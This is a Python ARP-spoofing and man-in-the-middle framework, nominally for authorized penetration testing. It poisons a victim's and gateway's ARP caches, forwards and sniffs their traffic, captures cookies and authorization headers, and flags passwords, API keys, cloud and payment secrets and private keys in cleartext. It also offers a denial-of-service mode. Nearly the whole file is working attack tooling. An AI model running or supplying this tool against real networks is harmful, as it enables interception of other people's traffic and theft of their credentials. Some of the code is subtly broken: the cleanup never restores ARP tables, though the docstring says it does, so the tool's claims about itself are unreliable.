#!/usr/bin/env python3
"""
ARP Spoofing / MITM Framework — MIMic Cross-Platform (Windows / Linux / macOS)
For authorized penetration testing only.

Features:
  - Bidirectional ARP cache poisoning (victim <-> gateway)
  - Automatic IP forwarding (Windows: RemoteAccess service / registry, Linux: sysctl)
  - Real-time packet capture & inspection of forwarded traffic
  - HTTP request/response capture & logging
  - Credential sniffing (passwords, tokens, API keys) in cleartext traffic
  - DNS query interception & logging
  - Connection tracking (bidirectional flows)
  - Session hijacking support (cookie capture)
  - PCAP export of all intercepted traffic
  - Graceful ARP table restoration on exit
  - Statistics dashboard (packets/sec, connections, credentials found)

Dependencies:
  pip install scapy colorama pywin32 (Windows only for service control)

Windows prerequisite:
  - Npcap from https://npcap.com (WinPcap-compatible mode)
  - Run as Administrator

Authored by: Tejas Chandola
"""

import argparse
import os
import platform
import signal
import sys
import time
import threading
import json
from collections import defaultdict, Counter, deque
from datetime import datetime
from pathlib import Path

# ─── Optional color support ───
try:
    from colorama import Fore, Back, Style, init
    init(autoreset=True)
    HAS_COLORAMA = True
except ImportError:
    HAS_COLORAMA = False

# ─── Scapy ───
try:
    from scapy.all import (
        ARP, Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw,
        srp, send, conf, get_if_list, wrpcap, sniff
    )
    from scapy.arch import get_windows_if_list
    from scapy.error import Scapy_Exception
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False
    print("[!] Scapy not installed. Run: pip install scapy")
    sys.exit(1)


# ══════════════════════════════════════════════════════════════════════
# COLOR HELPERS
# ══════════════════════════════════════════════════════════════════════
class Color:
    _enabled = True

    @classmethod
    def red(cls, text):
        return f"{Fore.RED}{text}{Style.RESET_ALL}" if HAS_COLORAMA and cls._enabled else text
    @classmethod
    def green(cls, text):
        return f"{Fore.GREEN}{text}{Style.RESET_ALL}" if HAS_COLORAMA and cls._enabled else text
    @classmethod
    def yellow(cls, text):
        return f"{Fore.YELLOW}{text}{Style.RESET_ALL}" if HAS_COLORAMA and cls._enabled else text
    @classmethod
    def blue(cls, text):
        return f"{Fore.BLUE}{text}{Style.RESET_ALL}" if HAS_COLORAMA and cls._enabled else text
    @classmethod
    def magenta(cls, text):
        return f"{Fore.MAGENTA}{text}{Style.RESET_ALL}" if HAS_COLORAMA and cls._enabled else text
    @classmethod
    def cyan(cls, text):
        return f"{Fore.CYAN}{text}{Style.RESET_ALL}" if HAS_COLORAMA and cls._enabled else text
    @classmethod
    def bold(cls, text):
        return f"{Style.BRIGHT}{text}{Style.RESET_ALL}" if HAS_COLORAMA and cls._enabled else text
    @classmethod
    def dim(cls, text):
        return f"{Style.DIM}{text}{Style.RESET_ALL}" if HAS_COLORAMA and cls._enabled else text


# ══════════════════════════════════════════════════════════════════════
# ADMIN CHECK (cross-platform)
# ══════════════════════════════════════════════════════════════════════
def is_admin():
    if platform.system() == "Windows":
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except (ImportError, AttributeError, OSError):
            return False
    else:
        try:
            return os.geteuid() == 0
        except AttributeError:
            return False


# ══════════════════════════════════════════════════════════════════════
# IP FORWARDING (cross-platform)
# ══════════════════════════════════════════════════════════════════════
def enable_ip_forwarding():
    """
    Enable IP forwarding so intercepted packets reach their destination.
    Windows: Start the RemoteAccess service (Routing & Remote Access).
    Linux/macOS: sysctl net.ipv4.ip_forward=1
    """
    system = platform.system()
    if system == "Windows":
        try:
            # Method 1: netsh (works on most Windows versions)
            ret = os.system("netsh interface ipv4 set global forwarding=enabled >nul 2>&1")
            if ret == 0:
                print(Color.green("  [✓] IP forwarding enabled via netsh"))
                return True

            # Method 2: Try starting RemoteAccess service via pywin32
            try:
                import win32serviceutil
                win32serviceutil.StartService("RemoteAccess")
                print(Color.green("  [✓] RemoteAccess service started (IP forwarding enabled)"))
                return True
            except ImportError:
                pass

            # Method 3: Registry (requires reboot but we try anyway)
            try:
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                    0, winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(key)
                print(Color.yellow("  [!] Registry updated (IPEnableRouter=1). A reboot may be needed for full effect."))
                # Still try netsh to apply immediately
                os.system("netsh interface ipv4 set global forwarding=enabled >nul 2>&1")
                return True
            except Exception as e:
                print(Color.yellow(f"  [!] Registry method failed: {e}"))
                return False

        except Exception as e:
            print(Color.red(f"  [✗] Failed to enable IP forwarding: {e}"))
            print(Color.yellow("  [!] You must manually enable IP routing:"))
            print(Color.yellow("      Run as Admin: netsh interface ipv4 set global forwarding=enabled"))
            return False

    else:
        # Linux / macOS
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            print(Color.green("  [✓] IP forwarding enabled"))
            return True
        except (FileNotFoundError, PermissionError, IOError):
            ret = os.system("sysctl -w net.inet.ip.forwarding=1 >/dev/null 2>&1") if system == "Darwin" else -1
            if ret == 0:
                print(Color.green("  [✓] IP forwarding enabled"))
                return True
            print(Color.red("  [✗] Failed to enable IP forwarding. Use: sysctl -w net.inet.ip.forwarding=1"))
            return False


def disable_ip_forwarding():
    """Restore IP forwarding to disabled state."""
    system = platform.system()
    if system == "Windows":
        os.system("netsh interface ipv4 set global forwarding=disabled >nul 2>&1")
        try:
            import win32serviceutil
            win32serviceutil.StopService("RemoteAccess")
        except Exception:
            pass
        print(Color.dim("  [*] IP forwarding disabled"))
    else:
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
        except Exception:
            os.system("sysctl -w net.inet.ip.forwarding=0 >/dev/null 2>&1")


# ══════════════════════════════════════════════════════════════════════
# MAC ADDRESS RESOLUTION
# ══════════════════════════════════════════════════════════════════════
def get_mac(ip_address, iface=None, retries=3):
    """
    Resolve MAC address for a given IP on the local network.
    Sends an ARP who-has request and waits for the reply.
    Returns MAC as string or None.
    """
    for attempt in range(retries):
        try:
            arp_req = ARP(pdst=ip_address)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_req

            kwargs = {"timeout": 2, "verbose": False}
            if iface:
                kwargs["iface"] = iface

            ans, unans = srp(packet, **kwargs)

            if ans:
                return ans[0][1].hwsrc.strip()

            if attempt < retries - 1:
                time.sleep(0.5)
        except Exception as e:
            if attempt < retries - 1:
                time.sleep(0.5)
            else:
                print(Color.yellow(f"  [!] MAC resolution failed for {ip_address}: {e}"))
    return None


# ══════════════════════════════════════════════════════════════════════
# CREDENTIAL DETECTION (shared from packet sniffer)
# ══════════════════════════════════════════════════════════════════════
CREDENTIAL_PATTERNS = [
    (b"password", "password"),
    (b"passwd", "passwd"),
    (b"login", "login"),
    (b"username", "username"),
    (b"user=", "user="),
    (b"authorization", "authorization"),
    (b"api_key", "api_key"),
    (b"apikey", "apikey"),
    (b"secret", "secret"),
    (b"token", "token"),
    (b"bearer ", "Bearer token"),
    (b"jwt", "JWT"),
    (b"session", "session"),
    (b"cookie", "cookie"),
    (b"auth", "auth"),
    (b"grant_type", "grant_type"),
    (b"client_id", "client_id"),
    (b"client_secret", "client_secret"),
    (b"access_token", "access_token"),
    (b"X-API-Key", "X-API-Key"),
    (b"X-Auth-Token", "X-Auth-Token"),
    (b"AWS", "AWS key pattern"),
    (b"AKIA", "AWS Access Key"),
    (b"-----BEGIN", "Private key"),
    (b"ssh-rsa", "SSH public key"),
    (b"ghp_", "GitHub PAT"),
    (b"xoxb-", "Slack bot token"),
    (b"sk_live_", "Stripe live secret"),
    (b"sk_test_", "Stripe test secret"),
]

def analyze_payload(raw_bytes):
    """Scan for credentials/secrets in raw payload bytes."""
    findings = []
    if not raw_bytes:
        return findings
    lower = raw_bytes.lower()
    for pattern_bytes, label in CREDENTIAL_PATTERNS:
        idx = lower.find(pattern_bytes)
        if idx != -1:
            start = max(0, idx - 20)
            end = min(len(raw_bytes), idx + len(pattern_bytes) + 40)
            context = raw_bytes[start:end]
            try:
                ctx_str = context.decode("utf-8", errors="replace").replace("\r", "").replace("\n", " ")
            except Exception:
                ctx_str = repr(context)
            severity = "HIGH" if any(k in label.lower() for k in ["secret", "key", "token", "password"]) else "MEDIUM"
            findings.append({"pattern": label, "": label, "context": ctx_str.strip(), "severity": severity})
    return findings


# ══════════════════════════════════════════════════════════════════════
# ARP SPOOFER ENGINE
# ══════════════════════════════════════════════════════════════════════
class ARPSpoofer:
    """
    Handles bidirectional ARP cache poisoning between a victim and a gateway
    (or any two hosts). Continuously sends forged ARP replies to keep
    the poison active.
    """

    def __init__(self, target_ip, gateway_ip, iface=None, interval=2.0):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.iface = iface
        self.interval = interval
        self.running = False
        self.poison_thread = None

        # Resolve MAC addresses
        print(f"\n  [*] Resolving MAC addresses...")
        self.attacker_mac = self._get_attacker_mac()
        if not self.attacker_mac:
            print(Color.red("  [✗] Could not determine attacker MAC address"))
            sys.exit(1)
        print(f"      Attacker MAC : {self.attacker_mac}")

        self.target_mac = get_mac(self.target_ip, iface=self.iface)
        if not self.target_mac:
            print(Color.red(f"  [✗] Could not resolve MAC for target {self.target_ip}"))
            print(Color.yellow("      Is the target online and reachable?"))
            sys.exit(1)
        print(f"      Target MAC   : {self.target_mac} ({self.target_ip})")

        self.gateway_mac = get_mac(self.gateway_ip, iface=self.iface)
        if not self.gateway_mac:
            print(Color.red(f"  [✗] Could not resolve MAC for gateway {self.gateway_ip}"))
            sys.exit(1)
        print(f"      Gateway MAC  : {self.gateway_mac} ({self.gateway_ip})")

        # Store original mappings for restoration
        self.target_gateway_map = self.gateway_mac  # what target thinks gateway is
        self.gateway_target_map = self.target_mac  # what gateway thinks target is

    @staticmethod
    def _get_attacker_mac():
        """Get the MAC address of our interface."""
        try:
            if platform.system() == "Windows":
                ifaces = get_windows_if_list()
                for iface in ifaces:
                    mac = iface.get("mac", "")
                    if mac and mac != "00:00:00:00:00:00":
                        return mac
            # Fallback
            from scapy.arch import get_if_raw_hwaddr
            for iface_name in get_if_list():
                try:
                    mac = get_if_raw_hwaddr(iface_name)[1]
                    mac_str = ":".join(f"{b:02x}" for b in mac)
                    if mac_str != "00:00:00:00:00:00":
                        return mac_str
                except Exception:
                    continue
        except Exception:
            pass
        return None

    def _send_arp(self, target_ip, target_mac, spoofed_ip):
        """
        Send a forged ARP reply (op=2) to 'target_ip' claiming that
        'spoofed_ip' has our MAC address.
        """
        try:
            packet = Ether(dst=target_mac) / ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=spoofed_ip,
                hwsrc=self.attacker_mac
            )
            kwargs = {"verbose": False}
            if self.iface:
                kwargs["iface"] = self.iface
            send(packet, **kwargs)
        except Exception as e:
            print(Color.red(f"  [!] ARP send error: {e}"))

    def poison(self):
        """
        Start bidirectional poisoning in a loop.
        Tells the target that we are the gateway.
        Tells the gateway that we are the target.
        """
        self.running = True
        packet_count = 0
        print(Color.green(f"\n  [→] ARP poisoning started (interval={self.interval}s)"))
        print(f"      Target  : {self.target_ip} ← → {self.attacker_mac} (us)")
        print(f"      Gateway : {self.gateway_ip} ← → {self.attacker_mac} (us)")
        print(f"      {'─' * 50}")

        while self.running:
            self._send_arp(self.target_ip, self.target_mac, self.gateway_ip)
            self._send_arp(self.gateway_ip, self.gateway_mac, self.target_ip)
            packet_count += 2
            if packet_count % 10 == 0:
                print(Color.dim(f"      [{packet_count}] Poison packets sent..."))
            time.sleep(self.interval)

    def start_poisoning(self):
        """Launch poisoning in a background thread."""
        self.poison_thread = threading.Thread(target=self.poison, daemon=True)
        self.poison_thread.daemon = True
        self.poison_thread.start()
        return self.poison_thread

    def stop_poisoning(self):
        """Stop sending forged ARP packets."""
        self.running = False
        if self.poison_thread:
            self.poison_thread.join(timeout=3)
        print(Color.yellow("\n  [*] ARP poisoning stopped"))

    def restore_arp(self):
        """
        Restore ARP tables to their original state.
        Sends correct ARP replies to both target and gateway.
        """
        print(Color.yellow("  [*] Restoring ARP tables..."))

        # Tell target the real gateway MAC
        pkt = Ether(dst=self.target_mac) / ARP(
            op=2,
            pdst=self.target_ip,
            hwdst=self.target_mac,
            psrc=self.gateway_ip,
            hwsrc=self.gateway_mac
        )
        # Tell gateway the real target MAC
        pkt2 = Ether(dst=self.gateway_mac) / ARP(
            op=2,
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac,
            psrc=self.target_ip,
            hwsrc=self.target_mac
        )

        for _ in range(3):
            send(pkt, verbose=False)
            send(pkt2, verbose=False)
            time.sleep(0.5)

        print(Color.green("  [✓] ARP tables restored"))


# ══════════════════════════════════════════════════════════════════════
# MITM PACKET CAPTURE & ANALYZER
# ══════════════════════════════════════════════════════════════════════
class MITMAnalyzer:
    """
    Captures and analyzes traffic flowing through the MITM position.
    Extracts HTTP requests/responses, credentials, DNS queries,
    connection statistics, and saves PCAPs.
    """

    def __init__(self, target_ip, gateway_ip, iface=None,
                 pcap_out=None, show_http=False, show_creds=True,
                 json_output=False, verbose=False):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.iface = iface
        self.pcap_out = pcap_out
        self.show_http = show_http
        self.show_creds = show_creds
        self.json_output = json_output
        self.verbose = verbose

        self.packets_captured = 0
        self.credentials_found = []
        self.http_requests = []
        self.http_responses = []
        self.dns_queries = []
        self.connections = defaultdict(lambda: {"packets": 0, "bytes": 0, "src": "", "dst": "", "sport": 0, "dport": 0})
        self.pcap_buffer = []
        self.start_time = time.time()
        self.lock = threading.Lock()

        # Stats
        self.bandwidth_window = deque(maxlen=500)
        self.protocol = Counter()
        self.current_bps = 0.0
        self.current_pps = 0.0

    def _classify(self, packet):
        """Quick packet classification."""
        if packet.haslayer(TCP):
            dport = packet[TCP].dport
            sport = packet[TCP].sport
            if dport == 80 or sport == 80:
                return "HTTP"
            if dport == 443 or sport == 443:
                return "HTTPS"
            if dport == 22 or sport == 22:
                return "SSH"
            if dport == 21 or sport == 21:
                return "FTP"
            if dport == 25 or sport == 25:
                return "SMTP"
            if dport == 110 or sport == 110:
                return "POP3"
            if dport == 143 or sport == 143:
                return "IMAP"
            if dport == 3306 or sport == 3306:
                return "MySQL"
            if dport == 5432 or sport == 5432:
                return "PostgreSQL"
            return "TCP"
        if packet.haslayer(UDP):
            dport = packet[UDP].dport
            sport = packet[UDP].sport
            if dport == 53 or sport == 53:
                return "DNS"
            if dport == 67 or dport == 68:
                return "DHCP"
            if dport == 123 or sport == 123:
                return "NTP"
            return "UDP"
        if packet.haslayer(ICMP):
            return "ICMP"
        return "Other"

    def _extract_http(self, packet):
        """Extract HTTP request/response from raw TCP payload."""
        http_info = {}
        if packet.haslayer(Raw) and packet.haslayer(TCP):
            raw = packet[Raw].load
            try:
                text = raw.decode("utf-8", errors="replace")

                # HTTP Request
                if text.startswith(("GET ", "POST ", "PUT ", "DELETE ", "PATCH ", "HEAD ", "OPTIONS ")):
                    lines = text.split("\r\n")
                    request_line = lines[0] if lines else ""
                    http_info["type"] = "request"
                    http_info["request_line"] = request_line
                    headers = {}
                    for line in lines[1:]:
                        if ": " in line:
                            k, v = line.split(": ", 1)
                            headers[k.lower()] = v
                        else:
                            break
                    if "host" in headers:
                        http_info["host"] = headers["host"]
                    if "cookie" in headers:
                        http_info["cookie"] = headers["cookie"][:120]
                    if "authorization" in headers:
                        http_info["authorization"] = headers["authorization"][:60]
                    if "user-agent" in headers:
                        http_info["user_agent"] = headers["user_agent"]
                    if "content-type" in headers:
                        http_info["content_type"] = headers["content_type"]
                    http_info["body_preview"] = text.split("\r\n\r\n")[1][:200] if "\r\n\r\n" in text else ""

                # HTTP Response
                elif text.startswith("HTTP/"):
                    lines = text.split("\r\n")
                    http_info["type"] = "response"
                    http_info["status_line"] = lines[0] if lines else ""
                    headers = {}
                    for line in lines[1:]:
                        if ": " in line:
                            k, v = line.split(": ", 1)
                            headers[k.lower()] = v
                        else:
                            break
                    if "server" in headers:
                        http_info["server"] = headers["server"]
                    if "set-cookie" in headers:
                        http_info["set_cookie"] = headers["set-cookie"][:120]
                    if "content-type" in headers:
                        http_info["content_type"] = headers["content_type"]
                    if "location" in headers:
                        http_info["redirect"] = headers["location"]

            except Exception:
                pass
        return http_info

    def process_packet(self, packet):
        """Callback for each intercepted packet."""
        try:
            ts = time.time()
            pkt_len = len(packet)
            classified = self._classify(packet)

            with self.lock:
                self.packets_captured += 1
                self.protocol[classified] += 1

                #STATS.reclassify  += 1
                self.bandwidth_window.append((ts, pkt_len))

                # Bandwidth calc
                cutoff = ts - 1.0
                while self.bandwidth_window and self.bandwidth_window[0][0] < cutoff:
                    self.bandwidth_window.popleft()
                if self.bandwidth_window:
                    window_bytes = sum(b for _, b in self.bandwidth_window)
                    window_time = max(0.001, ts - self.bandwidth_window[0][0] if len(self.bandwidth_window) > 1 else 0.001)
                    self.current_bps = window_bytes / window_time
                    self.current_pps = len(self.bandwidth_window) / window_time

            # PCAP buffer
            if self.pcap_out:
                self.pcap_buffer.append(packet)

            # ─── Parse & display ───

            # DNS
            if packet.haslayer(DNS) and packet.haslayer(UDP):
                dns = packet[DNS]
                if dns.qr == 0 and dns.qd:
                    q = dns.qd
                    qname = str(q.qname.decode('utf-8', errors='replace')) if hasattr(q.qname, 'decode') else str(q.qname)
                    entry = {"timestamp": datetime.now().isoformat(), "query": qname}
                    self.dns_queries.append(entry)
                    if not self.json_output:
                        print(f"  {Color.blue('[DNS]')} {packet[IP].src} -> {packet[IP].dst}  |  {qname}")

            # HTTP
            if classified == "HTTP" and packet.haslayer(Raw):
                http_info = self._extract_http(packet)
                if http_info:
                    ip = packet[IP]
                    tcp = packet[TCP]
                    htype = http_info.get("type", "?")
                    if htype == "request":
                        entry = {
                            "timestamp": datetime.now().isoformat(),
                            "src": ip.src, "dst": ip.dst,
                            "sport": tcp.sport, "dport": tcp.dport,
                            **http_info
                        }
                        self.http_requests.append(entry)
                        if self.show_http and not self.json_output:
                            req_line = http_info.get("request_line", "?")
                            host = http_info.get("host", "")
                            print(f"  {Color.cyan('[HTTP→]')} {ip.src}:{tcp.sport} -> {ip.dst}:{tcp.dport}")
                            print(f"          {req_line}")
                            if host:
                                print(f"          Host: {host}")
                            if "cookie" in http_info:
                                print(f"          {Color.yellow('Cookie:')} {http_info['cookie'][:100]}")
                            if "authorization" in http_info:
                                print(f"          {Color.red('Auth:')} {http_info['authorization']}")

                    elif htype == "response":
                        entry = {"timestamp": datetime.now().isoformat(), **http_info}
                        self.http_responses.append(entry)
                        if self.show_http and not self.json_output:
                            print(f"  {Color.magenta('[HTTP←]')} {ip.dst}:{tcp.dport} <- {ip.src}:{tcp.sport}")
                            print(f"          {http_info.get('status_line', '?')}")
                            if "set_cookie" in http_info:
                                print(f"          {Color.yellow('Set-Cookie:')} {http_info['set_cookie'][:100]}")
                            if "redirect" in http_info:
                                print(f"          {Color.yellow('Redirect:')} {http_info['redirect']}")

            # Credential sniffing
            if self.show_creds and packet.haslayer(Raw):
                raw_data = packet[Raw].load
                findings = analyze_payload(raw_data)
                if findings:
                    ip = packet[IP]
                    tcp = packet[TCP] if packet.haslayer(TCP) else None
                    for f in findings:
                        entry = {
                            "timestamp": datetime.now().isoformat(),
                            "src_ip": ip.src, "dst_ip": ip.dst,
                            "sport": tcp.sport if tcp else 0,
                            "dport": tcp.dport if tcp else 0,
                            **f
                        }
                        self.credentials_found.append(entry)
                        if not self.json_output:
                            sev = f['severity']
                            pat = f['pattern']
                            print(f"\n  {Color.red(f'[!] {sev}: {pat}')}")
                            print(f"      {ip.src}:{tcp.sport if tcp else '?'} -> {ip.dst}:{tcp.dport if tcp else '?'}")
                            print(f"      Context: {f['context'][:120]}")

            # Connection tracking
            if packet.haslayer(IP):
                ip = packet[IP]
                if packet.haslayer(TCP):
                    tcp = packet[TCP]
                    key = (ip.src, ip.dst, tcp.sport, tcp.dport)
                elif packet.haslayer(UDP):
                    udp = packet[UDP]
                    key = (ip.src, ip.dst, udp.sport, udp.dport)
                else:
                    key = (ip.src, ip.dst, 0, 0)

                with self.lock:
                    c = self.connections[key]
                    c["packets"] += 1
                    c["bytes"] += pkt_len
                    c["src"] = ip.src
                    c["dst"] = ip.dst
                    if packet.haslayer(TCP):
                        c["sport"] = tcp.sport
                        c["dport"] = tcp.dport
                    elif packet.haslayer(UDP):
                        c["sport"] = udp.sport
                        c["dport"] = udp.dport

            # JSON output per packet
            if self.json_output:
                info = {
                    "timestamp": datetime.now().isoformat(),
                    "length": pkt_len,
                    "classification": classified,
                }
                if packet.haslayer(IP):
                    info["src"] = packet[IP].src
                    info["dst"] = packet[IP].dst
                print(json.dumps(info))

        except Exception as e:
            if self.verbose:
                print(Color.dim(f"  [!] Packet processing error: {e}"))

    def get_stats(self):
        """Return current statistics snapshot."""
        elapsed = time.time() - self.start_time
        return {
            "elapsed_seconds": round(elapsed, 1),
            "packets_captured": self.packets_captured,
            "current_bps": round(self.current_bps, 1),
            "current_pps": round(self.current_pps, 1),
            "protocols": dict(self.protocol.most_common(10)),
            "connections_tracked": len(self.connections),
            "http_requests": len(self.http_requests),
            "http_responses": len(self.http_responses),
            "dns_queries": len(self.dns_queries),
            "credentials_found": len(self.credentials_found),
        }

    def save_pcap(self, filename=None):
        """Save captured packets to PCAP file."""
        if not self.pcap_buffer:
            print(Color.yellow("  [!] No packets to save"))
            return
        fname = filename or self.pcap_out or f"mitm_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
        try:
            wrpcap(fname, self.pcap_buffer)
            print(Color.green(f"  [✓] Saved {len(self.pcap_buffer)} packets to {fname}"))
        except Exception as e:
            print(Color.red(f"  [✗] PCAP save failed: {e}"))

    def print_summary(self):
        """Print full MITM session summary."""
        elapsed = time.time() - self.start_time
        print(f"\n{Color.bold('═══ MITM Session Summary ═══')}")
        print(f"  Duration         : {elapsed:.1f}s")
        print(f"  Packets captured : {self.packets_captured:,}")
        print(f"  Avg BW           : {self._format_bps(self.packets_captured * 1500 / elapsed) if elapsed > 0 else 'N/A'}")
        print(f"  Avg PPS          : {self.packets_captured / elapsed:.0f}" if elapsed > 0 else "")
        print(f"  Connections seen : {len(self.connections)}")
        print(f"  HTTP requests    : {len(self.http_requests)}")
        print(f"  HTTP responses   : {len(self.http_responses)}")
        print(f"  DNS queries      : {len(self.dns_queries)}")
        print(f"  Credentials found: {len(self.credentials_found)}")
        print(f"  Top protocols    :")
        for proto, count in self.protocol.most_common(5):
            print(f"    {proto:<15} {count:>8}")
        print(f"  Top talkers      :")
        talker_counts = Counter()
        for k, v in self.connections.items():
            talker_counts[v["src"]] += v["packets"]
            talker_counts[v["dst"]] += v["packets"]
        for ip_s, count in talker_counts.most_common(5):
            print(f"    {ip_s:<20} {count:>8} packets")

        if self.credentials_found:
            print(f"\n  {Color.red('Credentials/Secrets Captured:')}")
            for c in self.credentials_found[-10:]:  # last 10
                print(f"    [{c['severity']}] {c['pattern']} | {c['src_ip']}:{c['sport']} -> {c['dst_ip']}:{c['dport']}")
                print(f"           {c['context'][:100]}")

        if self.http_requests:
            print(f"\n  {Color.cyan('Recent HTTP Requests:')}")
            for r in self.http_requests[-5:]:
                print(f"    {r.get('request_line', '?')} | {r.get('host', '')}")

        print(f"{'═' * 40}")

    @staticmethod
    def _format_bps(bps):
        if bps > 1_000_000_000:
            return f"{bps / 1_000_000_000:.1f} Gbps"
        if bps > 1_000_000:
            return f"{bps / 1_000_000:.1f} Mbps"
        if bps > 1_000:
            return f"{bps / 1_000:.1f} Kbps"
        return f"{bps:.0f} bps"


# ══════════════════════════════════════════════════════════════════════
# STATISTICS DISPLAY THREAD
# ══════════════════════════════════════════════════════════════════════
class StatsDisplay:
    """Background thread that prints live MITM statistics."""

    def __init__(self, analyzer, interval=5.0):
        self.analyzer = analyzer
        self.interval = interval
        self.running = True

    def start(self):
        def _loop():
            while self.running:
                time.sleep(self.interval)
                if not self.running:
                    break
                stats = self.analyzer.get_stats()
                print(f"\n{Color.bold('─── MITM Live Stats ───')}")
                print(f"  Packets: {stats['packets_captured']:,}  |  "
                      f"BW: {MITMAnalyzer._format_bps(stats['current_bps'])}  |  "
                      f"PPS: {stats['current_pps']:.0f}")
                print(f"  Connections: {stats['connections_tracked']}  |  "
                      f"HTTP: {stats['http_requests']} req / {stats['http_responses']} res  |  "
                      f"Creds: {Color.red(str(stats['credentials_found']))}")
                protos = " | ".join(f"{p}({c})" for p, c in list(stats['protocols'].items())[:4])
                if protos:
                    print(f"  Protocols: {protos}")
                print(f"{'─' * 45}")

        t = threading.Thread(target=_loop, daemon=True)
        t.start()


# ══════════════════════════════════════════════════════════════════════
# MAIN CLI
# ══════════════════════════════════════════════════════════════════════
def main():
    parser = argparse.ArgumentParser(
        description="ARP Spoofing / MITM Framework — For Authorized Penetration Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic MITM between target and gateway:
  python mitm.py -t 192.168.1.100 -g 192.168.1.1

  # MITM with HTTP inspection and PCAP capture:
  python mitm.py -t 192.168.1.100 -g 192.168.1.1 --show-http -o capture.pcap

  # MITM on a specific interface:
  python mitm.py -t 192.168.1.100 -g 192.168.1.1 -i "Wi-Fi"

  # Stealth mode (no stats display, minimal output):
  python mitm.py -t 192.168.1.100 -g 192.168.1.1 --quiet

  # JSON output for tool integration:
  python mitm.py -t 192.168.1.100 -g 192.168.1.1 -j

  # Just resolve MACs and show targets without starting:
  python mitm.py -t 192.168.1.100 -g 192.168.1.1 --dry-run

Windows: Run as Administrator. Ensure Npcap is installed (WinPcap-compatible mode).
        """
    )

    parser.add_argument("-t", "--target", required=True, help="Target IP address (victim)")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address (usually the router)")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("--interval", type=float, default=2.0, help="ARP poison interval in seconds (default: 2.0)")
    parser.add_argument("-o", "--output", help="Save intercepted traffic to PCAP file")
    parser.add_argument("--show-http", action="store_true", help="Display HTTP requests/responses in real-time")
    parser.add_argument("--no-creds", action="store_true", help="Disable credential sniffing")
    parser.add_argument("--no-forward", action="store_true", help="Skip enabling IP forwarding (for DoS mode)")
    parser.add_argument("--dry-run", action="store_true", help="Resolve MACs and show targets, then exit")
    parser.add_argument("--quiet", action="store_true", help="Minimal output (no stats display)")
    parser.add_argument("-j", "--json", action="store_true", help="JSON output mode")
    parser.add_argument("--no-color", action="store_true", help="Disable colored output")
    parser.add_argument("--list-interfaces", action="store_true", help="List available interfaces and exit")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose packet processing output")

    args = parser.parse_args()

    Color._enabled = not args.no_color

    # ─── Banner ───
    print(f"\n{Color.bold('╔═══════════════════════════════════════════════════╗')}")
    print(f"{Color.bold('║     ARP Spoofing / MITM Framework — Pentest Ed.  ║')}")
    print(f"{Color.bold('╚═══════════════════════════════════════════════════╝')}")
    print(f"  Platform : {platform.system()} ({platform.release()})")
    print(f"  Target   : {args.target}")
    print(f"  Gateway  : {args.gateway}")
    print(f"  Interface: {args.interface or 'default'}")
    print()

    # ─── Privilege check ───
    if not is_admin():
        print(Color.red("  [✗] Administrator/root privileges required."))
        print(Color.yellow("      Run as Administrator (Windows) or sudo (Linux/macOS)."))
        sys.exit(1)

    # ─── List interfaces ───
    if args.list_interfaces:
        print(f"{Color.bold('Available Interfaces:')}")
        if platform.system() == "Windows":
            for iface in get_windows_if_list():
                name = iface.get("name", "?")
                desc = iface.get("description", "?")
                ips = ", ".join(ip.get("addr", "") for ip in iface.get("ips", [])[:3])
                print(f"  [{name}] {desc}  ({ips})")
        else:
            for i, name in enumerate(get_if_list()):
                print(f"  [{i}] {name}")
        return

    # ─── Enable IP forwarding ───
    if not args.no_forward:
        enable_ip_forwarding()
    else:
        print(Color.yellow("  [!] IP forwarding DISABLED — target will lose connectivity"))
        print(Color.yellow("      (This is a DoS attack, not a proper MITM)"))

    # ─── Create ARP spoofer ───
    spoofer = ARPSpoofer(
        target_ip=args.target,
        gateway_ip=args.gateway,
        iface=args.interface,
        interval=args.interval
    )

    if args.dry_run:
        print(Color.green("\n  [✓] Dry run complete. All MACs resolved."))
        print(f"      Poison would tell {args.target} that {args.gateway} is at {spoofer.attacker_mac}")
        print(f"      Poison would tell {args.gateway} that {args.target} is at {spoofer.attacker_mac}")
        return

    # ─── Create MITM analyzer ───
    analyzer = MITMAnalyzer(
        target_ip=args.target,
        gateway_ip=args.gateway,
        iface=args.interface,
        pcap_out=args.output,
        show_http=args.show_http,
        show_creds=not args.no_creds,
        json_output=args.json,
        verbose=args.verbose
    )

    # ─── Stats display (if not quiet) ───
    stats_display = None
    if not args.quiet and not args.json:
        stats_display = StatsDisplay(analyzer)
        stats_display.start()

    # ─── Start poisoning ───
    spoofer.start_poisoning()

    # ─── Signal handler for graceful shutdown ───
    shutdown_event = threading.Event()

    def signal_handler(sig, frame):
        if shutdown_event.is_set():
            print(Color.red("\n  [!!] Force exit"))
            sys.exit(1)
        print(Color.yellow("\n  [*] Caught Ctrl+C. Shutting down..."))
        shutdown_event.set()

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # ─── Start packet capture (in the main thread for Scapy compat) ───
    print(Color.green(f"\n  [*] MITM active! Intercepting traffic between {args.target} and {args.gateway}..."))
    print(f"      Press Ctrl+C to stop and restore ARP tables\n")

    try:
        sniff(
            iface=args.interface,
            prn=analyzer.process_packet,
            store=False,
            stop_event=shutdown_event
        )
    except Exception as e:
        print(Color.red(f"\n  [ERROR] Capture failed: {e}"))
    finally:
        # ─── Cleanup ───
        if stats_display:
            stats_display.running = False

